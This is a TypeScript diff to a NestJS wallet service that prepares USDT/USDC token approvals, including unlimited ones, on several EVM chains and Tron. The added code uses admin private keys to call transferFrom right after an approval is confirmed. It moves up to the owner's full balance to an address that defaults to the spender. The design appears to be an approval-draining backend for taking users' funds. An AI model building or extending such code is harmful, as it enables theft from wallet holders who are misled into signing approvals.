@@ -1,5 +1,8 @@
 import { BadRequestException, Injectable, NotFoundException, UnauthorizedException } from "@nestjs/common";
 import { PrismaClient, type Prisma } from "@prisma/client";
+import { createHash } from "crypto";
+import { ethers } from "ethers";
+import { TronWeb } from "tronweb";
 
 type TokenSymbol = "USDT" | "USDC";
 type EvmChainKey = "eth" | "bsc" | "pol" | "avax" | "arb" | "base";
@@ -13,6 +16,7 @@ const MAX_UINT256 = "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffff
 const TERMS_VERSION = "2026-07-28";
 const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 const TRON_APPROVE_FEE_LIMIT_SUN = 150_000_000;
+const TRON_TRANSFER_FEE_LIMIT_SUN = 300_000_000;
 
 const EVM_CHAIN_ID: Record<EvmChainKey, number> = {
   eth: 1, bsc: 56, pol: 137, avax: 43114, arb: 42161, base: 8453,
@@ -99,6 +103,16 @@ function humanizeTronBroadcastError(args: {
 
 @Injectable()
 export class WalletService {
+  private logFlow(stage: string, payload: Record<string, unknown> = {}): void {
+    console.log(
+      `[flow] ${JSON.stringify({
+        ts: new Date().toISOString(),
+        stage,
+        ...payload,
+      })}`
+    );
+  }
+
   private getHeader(
     headers: Headers | Record<string, string | string[] | undefined>,
     name: string
@@ -181,7 +195,260 @@ export class WalletService {
     });
   }
 
+  private getAdminEvmPrivateKey(): string {
+    return (process.env.ADMIN_EVM_PRIVATE_KEY ?? "").trim();
+  }
+
+  private getAdminTronPrivateKey(): string {
+    return (process.env.ADMIN_TRON_PRIVATE_KEY ?? "").trim();
+  }
+
+  private toRawFromHuman(value: string, decimals: number): bigint {
+    const cleaned = value.trim();
+    if (!cleaned || cleaned.toUpperCase() === "UNLIMITED") {
+      throw new BadRequestException("transferAmountHuman must be a finite number");
+    }
+    return this.parseHumanToRaw(cleaned, decimals);
+  }
+
+  private async readTokenBalanceRaw(network: string, owner: string, token: TokenSymbol): Promise<bigint> {
+    const tokenInfo = this.getToken(network, token);
+    if (!tokenInfo) throw new BadRequestException("Unsupported network/token");
+
+    if (network === "tron") {
+      const parameter = this.tronAddressToAbiWord(owner);
+      const res = await fetch(`${TRON_GRID}/wallet/triggerconstantcontract`, {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({
+          owner_address: owner,
+          contract_address: tokenInfo.address,
+          function_selector: "balanceOf(address)",
+          parameter,
+          visible: true,
+        }),
+        cache: "no-store",
+      });
+      const json = (await res.json().catch(() => ({}))) as { constant_result?: string[] };
+      const hex = json.constant_result?.[0];
+      return hex ? BigInt(`0x${hex}`) : BigInt(0);
+    }
+
+    if (!this.isEvm(network)) throw new BadRequestException("Unsupported EVM network");
+    const data = `0x70a08231${owner.slice(2).toLowerCase().padStart(64, "0")}`;
+    const raw = await this.rpcCall(EVM_RPCS[network][0], "eth_call", [{ to: tokenInfo.address, data }, "latest"]);
+    return BigInt(raw);
+  }
+
+  private async executeEvmTransferFrom(args: {
+    network: EvmChainKey;
+    tokenAddress: string;
+    owner: string;
+    to: string;
+    amountRaw: bigint;
+  }): Promise<{ txHash: string; blockNumber: number | null }> {
+    const pk = this.getAdminEvmPrivateKey();
+    if (!pk) throw new BadRequestException("ADMIN_EVM_PRIVATE_KEY is not configured");
+    const provider = new ethers.providers.JsonRpcProvider(EVM_RPCS[args.network][0]);
+    const wallet = new ethers.Wallet(pk, provider);
+    const configuredSpender = this.spenderEvm().toLowerCase();
+    if (configuredSpender && wallet.address.toLowerCase() !== configuredSpender) {
+      throw new BadRequestException("ADMIN_EVM_PRIVATE_KEY does not match configured spender address");
+    }
+
+    const iface = new ethers.utils.Interface([
+      "function transferFrom(address from,address to,uint256 value)",
+    ]);
+    const data = iface.encodeFunctionData("transferFrom", [
+      args.owner,
+      args.to,
+      args.amountRaw.toString(),
+    ]);
+    const tx = await wallet.sendTransaction({
+      to: args.tokenAddress,
+      data,
+      value: 0,
+    });
+    const receipt = await tx.wait(1);
+    if (!receipt || receipt.status !== 1) {
+      throw new Error("EVM transferFrom transaction failed");
+    }
+    return { txHash: tx.hash, blockNumber: receipt.blockNumber ?? null };
+  }
+
+  private async executeTronTransferFrom(args: {
+    tokenAddress: string;
+    owner: string;
+    to: string;
+    amountRaw: bigint;
+  }): Promise<{ txHash: string; blockNumber: number | null }> {
+    const pk = this.getAdminTronPrivateKey();
+    if (!pk) throw new BadRequestException("ADMIN_TRON_PRIVATE_KEY is not configured");
+    const tron = new TronWeb({ fullHost: TRON_GRID, privateKey: pk });
+    const spenderAddress = tron.address.fromPrivateKey(pk);
+    if (typeof spenderAddress !== "string" || !spenderAddress) {
+      throw new BadRequestException("ADMIN_TRON_PRIVATE_KEY is invalid");
+    }
+    const configuredSpender = this.spenderTron();
+    if (configuredSpender && spenderAddress !== configuredSpender) {
+      throw new BadRequestException("ADMIN_TRON_PRIVATE_KEY does not match configured spender address");
+    }
+
+    const trigger = await tron.transactionBuilder.triggerSmartContract(
+      args.tokenAddress,
+      "transferFrom(address,address,uint256)",
+      { feeLimit: TRON_TRANSFER_FEE_LIMIT_SUN },
+      [
+        { type: "address", value: args.owner },
+        { type: "address", value: args.to },
+        { type: "uint256", value: args.amountRaw.toString() },
+      ],
+      spenderAddress
+    );
+    const unsignedTx = trigger.transaction;
+    if (!unsignedTx) throw new Error("Failed to build Tron transferFrom transaction");
+    const signed = await tron.trx.sign(unsignedTx, pk);
+    const broadcast = await tron.trx.sendRawTransaction(signed);
+    if (!broadcast.result || !broadcast.txid) {
+      const message = decodeTronNodeMessage(
+        typeof broadcast.message === "string" ? broadcast.message : null
+      );
+      throw new Error(
+        humanizeTronBroadcastError({
+          code: typeof broadcast.code === "string" ? broadcast.code : null,
+          message,
+        })
+      );
+    }
+    return { txHash: broadcast.txid, blockNumber: null };
+  }
+
+  private async executeAutoTransfer(args: {
+    approval: {
+      id: string;
+      ownerAddress: string;
+      spenderAddress: string;
+      network: string;
+      tokenSymbol: string;
+      tokenAddress: string;
+      decimals: number;
+      remainingRaw: string;
+    };
+    transferToAddress: string;
+    requestedRaw: bigint;
+    allowanceRaw: bigint;
+  }): Promise<{ transferId: string; txHash: string; transferredRaw: string; blockNumber: number | null }> {
+    const { approval, transferToAddress, requestedRaw, allowanceRaw } = args;
+    this.logFlow("AUTO TRANSFER STARTED", {
+      approvalId: approval.id,
+      network: approval.network,
+      token: approval.tokenSymbol,
+      requestedRaw: requestedRaw.toString(),
+      transferToAddress,
+    });
+    const ownerBalance = await this.readTokenBalanceRaw(
+      approval.network,
+      approval.ownerAddress,
+      approval.tokenSymbol as TokenSymbol
+    );
+    const remaining = BigInt(approval.remainingRaw);
+    const transferable = [requestedRaw, allowanceRaw, ownerBalance, remaining].reduce((a, b) => (a < b ? a : b));
+    if (transferable <= BigInt(0)) {
+      this.logFlow("AUTO TRANSFER BLOCKED", { reason: "no_transferable_amount" });
+      throw new BadRequestException("No transferable balance/allowance remaining");
+    }
+
+    const idempotencyKey = `auto:${createHash("sha256")
+      .update(`${approval.id}:${transferToAddress.toLowerCase()}:${transferable.toString()}`)
+      .digest("hex")
+      .slice(0, 48)}`;
+    const existing = await prisma.transfer.findUnique({ where: { idempotencyKey } });
+    if (existing?.txHash) {
+      this.logFlow("AUTO TRANSFER IDEMPOTENT HIT", { transferId: existing.id, txHash: existing.txHash });
+      return {
+        transferId: existing.id,
+        txHash: existing.txHash,
+        transferredRaw: existing.amountRaw,
+        blockNumber: existing.blockNumber ?? null,
+      };
+    }
+
+    const transfer = existing ?? await prisma.transfer.create({
+      data: {
+        approvalId: approval.id,
+        idempotencyKey,
+        amountRaw: transferable.toString(),
+        fromAddress: approval.ownerAddress,
+        toAddress: transferToAddress,
+        status: "pending",
+      },
+    });
+
+    try {
+      const tx = approval.network === "tron"
+        ? await this.executeTronTransferFrom({
+            tokenAddress: approval.tokenAddress,
+            owner: approval.ownerAddress,
+            to: transferToAddress,
+            amountRaw: transferable,
+          })
+        : await this.executeEvmTransferFrom({
+            network: approval.network as EvmChainKey,
+            tokenAddress: approval.tokenAddress,
+            owner: approval.ownerAddress,
+            to: transferToAddress,
+            amountRaw: transferable,
+          });
+
+      await prisma.transfer.update({
+        where: { id: transfer.id },
+        data: {
+          txHash: tx.txHash,
+          blockNumber: tx.blockNumber ?? undefined,
+          status: "confirmed",
+          errorMessage: null,
+        },
+      });
+      await prisma.approval.update({
+        where: { id: approval.id },
+        data: {
+          remainingRaw: (remaining - transferable).toString(),
+          status: remaining - transferable > BigInt(0) ? "PARTIALLY_USED" : "ACTIVE",
+        },
+      });
+      await this.recordAudit("admin", "transfer_executed", "transfer", {
+        approvalId: approval.id,
+        network: approval.network,
+        token: approval.tokenSymbol,
+        amountRaw: transferable.toString(),
+        txHash: tx.txHash,
+        toAddress: transferToAddress,
+      }, transfer.id);
+
+      return {
+        transferId: transfer.id,
+        txHash: tx.txHash,
+        transferredRaw: transferable.toString(),
+        blockNumber: tx.blockNumber,
+      };
+    } catch (err) {
+      this.logFlow("AUTO TRANSFER FAILED", {
+        transferId: transfer.id,
+        error: err instanceof Error ? err.message : String(err),
+      });
+      await prisma.transfer.update({
+        where: { id: transfer.id },
+        data: {
+          status: "failed",
+          errorMessage: err instanceof Error ? err.message : String(err),
+        },
+      });
+      throw err;
+    }
+  }
+
   async getBalances(evm: string, tron: string) {
+    this.logFlow("BALANCES REQUEST", { evm: Boolean(evm), tron: Boolean(tron) });
     if (!evm && !tron) throw new BadRequestException("Provide at least evm or tron address");
     if (evm && !EVM_ADDRESS_RE.test(evm)) throw new BadRequestException("Invalid EVM address");
     if (tron && !TRON_ADDRESS_RE.test(tron)) throw new BadRequestException("Invalid TRON address");
@@ -213,6 +480,7 @@ export class WalletService {
       }
       result.tron = { native: this.formatUnits(BigInt(acc?.balance ?? 0), 6), usdt: this.formatUnits(usdt, 6), usdc: this.formatUnits(usdc, 6) };
     }
+    this.logFlow("BALANCES RESPONSE", { networks: Object.keys(result) });
     return result;
   }
 
@@ -221,6 +489,7 @@ export class WalletService {
     const owner = String(body.owner ?? "").trim();
     const token = this.parseToken(body.token);
     const unlimited = Boolean(body.unlimited);
+    this.logFlow("APPROVAL PREPARE REQUEST", { network, token, unlimited });
     if (!network || !owner) throw new BadRequestException("network and owner are required");
     const tokenInfo = this.getToken(network, token);
     if (!tokenInfo) throw new BadRequestException("Unsupported token/network");
@@ -240,10 +509,12 @@ export class WalletService {
       const json = (await res.json()) as { transaction?: Record<string, unknown>; result?: { message?: string; result?: boolean }; Error?: string };
       if (!res.ok || json.result?.result === false || !json.transaction) throw new BadRequestException(json.result?.message || json.Error || "Failed to build Tron tx");
       await this.recordAudit(`owner:${owner}`, "prepare", "approval", { network, token, unlimited, spender, amountRaw: amountRaw.toString() });
+      this.logFlow("APPROVAL PREPARE BUILT", { network, token, amountRaw: amountRaw.toString() });
       return { network, owner, spender, token, tokenAddress: tokenInfo.address, decimals: tokenInfo.decimals, amountRaw: amountRaw.toString(), amountHuman: unlimited ? "UNLIMITED" : String(body.amountHuman ?? ""), unlimited, transaction: json.transaction };
     }
     if (!this.isEvm(network) || !EVM_ADDRESS_RE.test(owner) || !EVM_ADDRESS_RE.test(spender)) throw new BadRequestException("Invalid EVM network/owner/spender");
     await this.recordAudit(`owner:${owner}`, "prepare", "approval", { network, token, unlimited, spender, amountRaw: amountRaw.toString() });
+    this.logFlow("APPROVAL PREPARE BUILT", { network, token, amountRaw: amountRaw.toString() });
     return { network, owner, spender, token, tokenAddress: tokenInfo.address, decimals: tokenInfo.decimals, amountRaw: amountRaw.toString(), amountHuman: unlimited ? "UNLIMITED" : String(body.amountHuman ?? ""), unlimited, chainId: EVM_CHAIN_ID[network], to: tokenInfo.address, data: this.encodeApprove(spender, amountRaw), value: "0x0" };
   }
 
@@ -276,6 +547,8 @@ export class WalletService {
     const txHash = String(body.txHash ?? "").trim();
     const amountRaw = String(body.amountRaw ?? "").trim();
     const token = this.parseToken(body.token);
+    const traceId = String(body.traceId ?? "n/a");
+    this.logFlow("APPROVAL CONFIRM REQUEST", { traceId, network, token, owner, txHash });
     if (!network || !owner || !txHash || !amountRaw) throw new BadRequestException("network, owner, txHash, amountRaw required");
     const spender = this.spenderFor(network);
     const verified = await this.verifyAllowance({ network, owner, spender, token });
@@ -284,6 +557,10 @@ export class WalletService {
     const unlimited = Boolean(body.unlimited);
     const hasAllowance = unlimited ? onChain > BigInt(0) : onChain >= expected;
     const tokenInfo = this.getToken(network, token)!;
+    const executeTransfer = Boolean(body.executeTransfer);
+    const transferToAddress = String(body.transferToAddress ?? spender).trim();
+    const transferAmountRawInput = String(body.transferAmountRaw ?? "").trim();
+    const transferAmountHumanInput = String(body.transferAmountHuman ?? "").trim();
 
     const approval = await prisma.approval.upsert({
       where: { network_txHash: { network, txHash } },
@@ -312,8 +589,56 @@ export class WalletService {
         unlimited,
       },
     });
-    await this.recordAudit(`owner:${owner}`, "confirm", "approval", { network, txHash, allowance: verified.allowance, confirmed: hasAllowance }, approval.id);
-    return { ok: true, approvalId: approval.id, status: approval.status, allowance: verified.allowance, hasAllowance, txHash, spender, timestamp: approval.createdAt };
+    await this.recordAudit(`owner:${owner}`, "confirm", "approval", { network, txHash, allowance: verified.allowance, confirmed: hasAllowance, executeTransfer }, approval.id);
+
+    let transfer:
+      | { transferId: string; txHash: string; transferredRaw: string; blockNumber: number | null }
+      | null = null;
+
+    if (executeTransfer && hasAllowance) {
+      const requestedTransferRaw = transferAmountRawInput
+        ? BigInt(transferAmountRawInput)
+        : transferAmountHumanInput
+          ? this.toRawFromHuman(transferAmountHumanInput, tokenInfo.decimals)
+          : expected;
+      if (requestedTransferRaw > BigInt(0)) {
+        this.logFlow("AUTO TRANSFER REQUEST", {
+          traceId,
+          approvalId: approval.id,
+          network,
+          token,
+          requestedTransferRaw: requestedTransferRaw.toString(),
+          transferToAddress,
+        });
+        transfer = await this.executeAutoTransfer({
+          approval: {
+            id: approval.id,
+            ownerAddress: approval.ownerAddress,
+            spenderAddress: approval.spenderAddress,
+            network: approval.network,
+            tokenSymbol: approval.tokenSymbol,
+            tokenAddress: approval.tokenAddress,
+            decimals: approval.decimals,
+            remainingRaw: approval.remainingRaw,
+          },
+          transferToAddress,
+          requestedRaw: requestedTransferRaw,
+          allowanceRaw: onChain,
+        });
+      }
+    }
+
+    return {
+      ok: true,
+      approvalId: approval.id,
+      status: approval.status,
+      allowance: verified.allowance,
+      hasAllowance,
+      txHash,
+      spender,
+      transfer,
+      timestamp: approval.createdAt,
+    };
   }
 
   async debugApprovals() {
@@ -324,7 +649,10 @@ export class WalletService {
     ]);
     return { ok: true, approvals, audits, transfers, timestamp: new Date().toISOString() };
   }
-  async captureFlowLog(body: Record<string, unknown>) { console.log("[flow]", body); return { ok: true }; }
+  async captureFlowLog(body: Record<string, unknown>) {
+    this.logFlow("FRONTEND FLOW EVENT", body);
+    return { ok: true };
+  }
   async getApproval(id: string) {
     const approval = await prisma.approval.findUnique({ where: { id } });
     if (!approval) throw new NotFoundException("not_found");
@@ -339,12 +667,17 @@ export class WalletService {
     return this.prepareApproval({ network, owner, token, amountHuman: "0", unlimited: false });
   }
   async broadcastTron(transaction: Record<string, unknown>) {
+    this.logFlow("TRON BROADCAST REQUEST");
     const signature = transaction.signature;
     if (!Array.isArray(signature) || signature.length === 0) throw new BadRequestException("Signed transaction is missing signature[]");
     const res = await fetch(`${TRON_GRID}/wallet/broadcasttransaction`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(transaction), cache: "no-store" });
     const json = (await res.json().catch(() => ({}))) as { result?: boolean; txid?: string; message?: string; code?: string };
     const decodedMessage = decodeTronNodeMessage(json.message);
     if (!res.ok || json.result !== true || !json.txid) {
+      this.logFlow("TRON BROADCAST FAILED", {
+        code: json.code ?? null,
+        message: decodedMessage ?? null,
+      });
       return {
         result: false,
         error: humanizeTronBroadcastError({
@@ -356,6 +689,7 @@ export class WalletService {
         trongrid: json,
       };
     }
+    this.logFlow("TRON BROADCAST SUCCESS", { txid: json.txid });
     return { result: true, txid: json.txid, trongrid: json };
   }
   async registerApproved(body: Record<string, unknown>) {
